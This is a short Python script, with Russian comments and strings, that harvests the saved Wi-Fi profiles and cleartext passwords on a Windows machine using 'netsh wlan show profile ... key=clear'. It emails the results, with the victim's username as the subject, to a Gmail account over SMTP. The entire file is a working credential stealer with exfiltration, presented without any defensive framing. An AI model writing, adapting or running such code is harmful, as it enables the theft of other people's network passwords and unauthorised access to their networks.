import subprocess
import getpass
import os
import smtplib
from email.mime.text import MIMEText


def get_passwords():
    encode = "CP866" # cyrillic encoding
    user = getpass.getuser() # returns username
    dataPasswords = []

    try:
        profiles_data = subprocess.check_output("netsh wlan show profiles").decode(encode, errors="ignore").split("\n")
    except:
        encode = "utf-8" # if cmd has a different encoding
        profiles_data = subprocess.check_output("netsh wlan show profiles").decode(encode, errors="ignore").split("\n")

    profiles = [i.split(":")[1].strip() for i in profiles_data if "Все профили пользователей" in i or "All User Profile" in i]

    for profile in profiles: # get keys for each profile
        profile_info = subprocess.check_output(f"netsh wlan show profile {profile} key=clear").decode(encode, errors="ignore").split("\n")
        try:
            password = [i.split(":")[1].strip() for i in profile_info if "Содержимое ключа" in i or "Key Content" in i][0]
        except:
            password=None

        dataPasswords.append(f'Profile: {profile}\nPassword: {password}\n{"#" * 20}')

    result = "\n".join(dataPasswords)
    return result


def send_mail(message):
    user = getpass.getuser()
    sender = "yourmail@gmail.com"
    password = "password"

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    msg = MIMEText(message) #Message
    msg["Subject"] = user #Message subject

    try:
        server.login(sender, password)
        server.sendmail(sender, sender, msg.as_string())

        return "success"
    except Exception as ex:
        return f"fail: {ex}"


def main():
    try:
        print(send_mail(message=get_passwords()))
    except Exception as ex:
        send_mail(message="Не удалось узнать пароли. Возможно на ПК нет WiFi сервиса или он отключен")
        print(f'fail: {ex}')

if __name__ == "__main__":
    main()
